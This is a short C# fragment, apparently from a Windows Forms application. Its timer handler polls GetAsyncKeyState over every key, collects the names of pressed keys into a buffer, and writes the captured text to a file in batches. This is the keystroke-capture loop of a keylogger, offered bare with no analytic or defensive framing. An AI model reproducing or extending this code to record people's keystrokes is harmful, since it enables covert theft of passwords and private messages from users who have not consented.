	void timer1_Tick(object sender, EventArgs e)
	{
		string buffer = "";
		foreach (Int32 i in Enum.GetValues(typeof(Keys)))
		{
			if(GetAsyncKeyState(i) == -32767)
				buffer += RenameKey(Enum.GetName(typeof(Keys), i));
		}
		text += buffer;
		if (text.Length > 10)
		{
			WriteToText(text);
			text = "";
		}
	}
